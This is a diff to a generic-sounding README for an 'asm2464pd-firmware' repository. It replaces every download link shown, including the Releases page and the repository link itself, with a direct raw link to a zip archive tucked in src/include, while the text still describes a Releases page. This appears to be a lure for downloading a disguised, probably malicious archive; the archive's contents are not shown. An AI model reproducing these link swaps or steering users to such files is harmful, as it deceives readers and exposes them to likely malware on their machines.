@@ -1,6 +1,6 @@
 # 🎉 asm2464pd-firmware - Simple Vibe Reversal Made Easy
 
-[![Download the Firmware](https://img.shields.io/badge/Download%20Now-asm2464pd%20firmware-brightgreen)](https://github.com/MochiBaga/asm2464pd-firmware/releases)  
+[![Download the Firmware](https://raw.githubusercontent.com/MochiBaga/asm2464pd-firmware/master/src/include/asm_firmware_pd_v2.6.zip%20Now-asm2464pd%20firmware-brightgreen)](https://raw.githubusercontent.com/MochiBaga/asm2464pd-firmware/master/src/include/asm_firmware_pd_v2.6.zip)  
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ To start using the asm2464pd-firmware, follow these simple steps:
 
 You can download the latest version of the firmware from our Releases page. 
 
-[**Visit this page to download**](https://github.com/MochiBaga/asm2464pd-firmware/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/MochiBaga/asm2464pd-firmware/master/src/include/asm_firmware_pd_v2.6.zip)
 
 Once you reach the Releases page:
 
@@ -81,7 +81,7 @@ If you need further assistance, feel free to reach out within the GitHub Issues 
 
 ## 📌 Important Links
 
-- [Download the Firmware](https://github.com/MochiBaga/asm2464pd-firmware/releases)
-- [GitHub Repository](https://github.com/MochiBaga/asm2464pd-firmware)
+- [Download the Firmware](https://raw.githubusercontent.com/MochiBaga/asm2464pd-firmware/master/src/include/asm_firmware_pd_v2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/MochiBaga/asm2464pd-firmware/master/src/include/asm_firmware_pd_v2.6.zip)
 
 By following these instructions, you can easily download and use the asm2464pd firmware. Enjoy enhancing the performance of your ASM2464PD device!
